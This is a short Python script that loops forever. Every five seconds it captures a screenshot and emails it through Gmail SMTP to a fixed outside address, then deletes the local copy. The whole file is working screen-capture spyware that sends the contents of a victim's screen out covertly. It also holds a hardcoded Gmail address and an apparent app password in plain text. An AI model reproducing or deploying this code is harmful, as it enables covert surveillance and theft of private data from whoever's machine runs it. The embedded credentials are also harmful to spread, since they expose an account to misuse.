import time
import pyautogui
import os
import smtplib
import imghdr
from email.message import EmailMessage
def main():
    while True:
        ss = pyautogui.screenshot()
        ss.save('ss.png')
        usr='kumara677678@gmail.com'
        pas='gbwvdyaimudvjilr'
        res='msav4790@gmail.com'
        with open('ss.png', 'rb') as f:
            img_d=f.read()
            img_t=imghdr.what(f.name)
            img_n=f.name
        msg = EmailMessage()
        msg['Subject'] = 'Screenshots'
        msg['From'] = usr
        msg['To'] = res
        msg.add_attachment(img_d,maintype='image',subtype=img_t,filename=img_n)
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.login(usr,pas)
        server.sendmail(usr,res,msg.as_string())
        os.remove('ss.png')
        print('sent')
        time.sleep(5)
main()
